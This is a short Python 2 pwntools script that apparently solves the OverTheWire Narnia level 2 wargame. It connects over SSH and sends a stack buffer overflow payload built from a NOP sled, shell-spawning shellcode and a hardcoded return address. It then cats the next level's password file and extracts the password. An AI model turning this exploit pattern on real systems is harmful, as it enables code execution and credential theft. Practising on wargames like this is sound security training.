#!/usr/bin/python2
# trivial stack BoF. we use a nopsled as junk, followed by shellcode and ret addr that returns into nopsled.
def exploit(level2password):
    from pwn import *
    import re
    ssh = ssh('narnia2', 'narnia.labs.overthewire.org', password=level2password, port=2226)
    shell = ssh.run('sh')
    shellcode = asm(pwnlib.shellcraft.linux.sh())
    nops = "\x90"*96 # fuckin nop it
    hex_escaped = ''.join(["\\x%.2x" % ord(byte) for byte in shellcode]) # 44
    return_address = "\xc0\xd8\xff\xff"
    pwnsled = nops + hex_escaped + return_address
    pwn = """/narnia/narnia2 $(python -c 'print "%s"')""" %(pwnsled)
    shell.sendline(pwn)
    shell.sendline("cat /etc/narnia_pass/narnia3\n")
    buf = ""
    print "{+} Hunting fleg/readin response pls wait might take 1 minute..."
    for x in range(0, 10):
        buf += shell.recvline(timeout=5)
#    print buf
    # efeidiedae
    regex = re.findall('[a-z]{10}', buf)
    if len(regex):
        return regex[0]
#shell.interactive()

if __name__ == "__main__":
    level3pass = exploit()
    if level3pass != None:
        print "{$$} Level 3 Password is: %s" %(level3pass)
